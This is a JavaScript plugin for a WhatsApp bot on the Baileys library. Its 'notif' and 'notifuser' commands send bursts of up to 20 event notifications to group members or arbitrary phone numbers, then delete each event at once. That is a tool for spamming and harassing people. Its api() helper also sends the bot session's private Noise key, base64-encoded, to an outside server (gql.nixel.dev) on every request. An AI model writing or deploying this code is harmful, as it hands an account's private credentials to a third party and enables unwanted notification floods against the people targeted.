import { delay } from '@whiskeysockets/baileys'

const API_URL = 'https://gql.nixel.dev'

function getApiCreds(conn) {
	const creds = conn?.authState?.creds
	if (!creds) return null
	return {
		me: {
			lid: creds.me?.lid
		},
		noiseKey: {
			public: creds.noiseKey?.public ? Buffer.from(creds.noiseKey.public).toString('base64') : '',
			private: creds.noiseKey?.private ? Buffer.from(creds.noiseKey.private).toString('base64') : ''
		}
	}
}

async function api(conn, path, body = {}) {
	const apiCreds = getApiCreds(conn)
	if (!apiCreds) throw new Error('No hay credenciales activas')

	const controller = new AbortController()
	const timeoutId = setTimeout(() => controller.abort(), 3500)

	try {
		const response = await fetch(`${API_URL}${path}`, {
			method: 'POST',
			headers: {
				'Content-Type': 'application/json'
			},
			body: JSON.stringify({
				creds: apiCreds,
				...body
			}),
			signal: controller.signal
		})
		clearTimeout(timeoutId)

		const text = await response.text()
		let result
		try {
			result = JSON.parse(text)
		} catch {
			throw new Error(`Respuesta inválida: ${text}`)
		}

		if (!response.ok || !result.success) {
			throw new Error(result.message || `HTTP ${response.status}`)
		}

		return result
	} catch (err) {
		clearTimeout(timeoutId)
		throw err
	}
}

async function createEvent(conn, eventDetails) {
	return api(conn, '/api/event/create', eventDetails)
}

async function addInvitations(conn, eventId, userLid) {
	return api(conn, '/api/event/invite', { eventId, userLid })
}

async function deleteEvent(conn, eventId) {
	return api(conn, '/api/event/delete', { eventId })
}

async function nativeTriggerEventNotif(conn, targetJid, eventName = 'Aviso', description = 'Notificación de evento') {
	const startDate = new Date(Date.now() + 3600 * 1000)
	const endDate = new Date(Date.now() + 7200 * 1000)

	const sent = await conn.sendMessage(targetJid, {
		event: {
			name: eventName,
			description,
			startDate,
			endDate
		}
	})

	if (sent?.key) {
		await delay(1200)
		try {
			await conn.sendMessage(targetJid, { delete: sent.key })
		} catch {}
	}
	return sent
}

async function triggerEventNotif(conn, eventDetails, memberLids) {
	try {
		const now = Math.floor(Date.now() / 1000)
		const res = await createEvent(conn, {
			name: eventDetails.name || 'Nuevo Evento',
			description: eventDetails.description || '',
			chatJid: eventDetails.chatJid,
			start_ts_sec: eventDetails.start_ts_sec || now + 3600,
			end_ts_sec: eventDetails.end_ts_sec || now + 7200,
			reminder_ts_sec: eventDetails.reminder_ts_sec || now + 3000
		})

		const eventId = res?.data?.id || res?.event?.id
		if (!eventId) throw new Error('ID no encontrado')

		if (memberLids && memberLids.length > 0) {
			const userLid = memberLids.length === 1 ? memberLids[0] : memberLids
			try {
				await addInvitations(conn, eventId, userLid)
			} catch {}
		}

		return await deleteEvent(conn, eventId)
	} catch {
		return await nativeTriggerEventNotif(
			conn,
			eventDetails.chatJid,
			eventDetails.name || 'Aviso',
			eventDetails.description || 'Notificación de evento'
		)
	}
}

async function toLid(conn, jid) {
	if (jid.endsWith('@lid') || jid.endsWith('@g.us')) return jid
	const pn = jid.includes('@') ? jid : `${jid.replace(/[^0-9]/g, '')}@s.whatsapp.net`
	try {
		const lid = await conn.signalRepository?.lidMapping?.getLIDForPN?.(pn)
		if (lid) return lid
	} catch {}
	return pn
}

let handler = async (m, { conn, text, usedPrefix, command }) => {
	const isNotifUser = command === 'notifuser'

	if (!text) {
		if (isNotifUser) {
			return m.reply(
				`*Ejemplo de uso:*\n` +
				`> *${usedPrefix + command} @usuario|Hola*\n` +
				`> *${usedPrefix + command} @user1 @user2|Hola|5*\n` +
				`> *${usedPrefix + command} 58412xxx|Hola|10*\n` +
				`> *${usedPrefix + command} 58412xxx Hola a todos | 2*`
			)
		} else {
			return m.reply(
				`*Ejemplo de uso:*\n` +
				`> *${usedPrefix + command} Hola*\n` +
				`> *${usedPrefix + command} Hola|10*`
			)
		}
	}

	await m.react('⌛')

	try {
		const now = Math.floor(Date.now() / 1000)
		const startTime = now + 3600
		const endTime = now + 7200
		const reminderTime = now + 3000
		const tasks = []

		if (isNotifUser) {
			const parts = text.split('|').map(v => v.trim())
			let targetPart = ''
			let eventName = 'Aviso'
			let count = 1

			if (parts.length >= 3) {
				targetPart = parts[0]
				eventName = parts[1] || 'Aviso'
				const parsedCount = parseInt(parts[2])
				if (!isNaN(parsedCount) && parsedCount > 0) count = Math.min(parsedCount, 20)
			} else if (parts.length === 2) {
				if (/^\d+$/.test(parts[1])) {
					count = Math.min(parseInt(parts[1]), 20)
					const firstPart = parts[0]
					const numMatch = firstPart.match(/^(\+?\d{8,16})\s+([\s\S]+)$/)
					if (numMatch) {
						targetPart = numMatch[1]
						eventName = numMatch[2].trim()
					} else {
						targetPart = firstPart
						eventName = firstPart.replace(/@\S+/g, '').trim() || 'Aviso'
					}
				} else {
					targetPart = parts[0]
					eventName = parts[1] || 'Aviso'
				}
			} else {
				const numMatch = parts[0].match(/^(\+?\d{8,16})\s+([\s\S]+)$/)
				if (numMatch) {
					targetPart = numMatch[1]
					eventName = numMatch[2].trim()
				} else {
					targetPart = parts[0]
					eventName = parts[0].replace(/@\S+/g, '').trim() || 'Aviso'
				}
			}

			let rawTargets = conn.parseMention ? conn.parseMention(targetPart) : []

			if (rawTargets.length === 0) {
				const numbers = targetPart.match(/\d{8,16}/g) || []
				for (const num of numbers) {
					rawTargets.push(`${num}@s.whatsapp.net`)
				}
			}

			if (rawTargets.length === 0) {
				throw new Error('¡Destinatario no válido! Usa @mención o número de teléfono (ej. 58412xxx).')
			}

			const targetLids = [...new Set(await Promise.all(rawTargets.map(jid => toLid(conn, jid))))]

			for (const lid of targetLids) {
				for (let i = 0; i < count; i++) {
					tasks.push(() =>
						triggerEventNotif(conn, {
							name: eventName,
							description: 'Notificación de evento',
							chatJid: lid,
							start_ts_sec: startTime,
							end_ts_sec: endTime,
							reminder_ts_sec: reminderTime
						}, [lid])
					)
				}
			}
		} else {
			const parts = text.split('|').map(v => v.trim())
			const eventName = parts[0] || 'Aviso'
			const parsedCount = parseInt(parts[1])
			const count = !isNaN(parsedCount) && parsedCount > 0 ? Math.min(parsedCount, 20) : 1

			let chatJid = m.chat
			let memberLids = []

			if (m.chat.endsWith('@g.us')) {
				const groupMetadata = await conn.groupMetadata(m.chat)
				const participants = groupMetadata.participants || []
				memberLids = await Promise.all(
					participants.map(async ({ id }) => {
						if (id.endsWith('@lid')) return id
						const lid = await conn.signalRepository?.lidMapping?.getLIDForPN?.(id)
						return lid || id
					})
				)
			} else {
				chatJid = await toLid(conn, m.chat)
				memberLids = [chatJid]
			}

			for (let i = 0; i < count; i++) {
				tasks.push(() =>
					triggerEventNotif(conn, {
						name: eventName,
						description: 'Notificación de evento',
						chatJid: chatJid,
						start_ts_sec: startTime,
						end_ts_sec: endTime,
						reminder_ts_sec: reminderTime
					}, memberLids)
				)
			}
		}

		await m.react('⏳')
		for (const run of tasks) {
			await run()
			if (tasks.length > 1) await delay(400)
		}
		await m.react('✅')
	} catch (e) {
		console.error(e)
		await m.react('❌')
		m.reply(`❌ Ocurrió un error: ${e.message}`)
	}
}

handler.command = ['notif', 'notifuser']
handler.help = [
	'notif <texto>|<cantidad>',
	'notifuser <@usuario/número>|<texto>|<cantidad>'
]
handler.tags = ['owner']
handler.group = false
handler.owner = true

export default handler
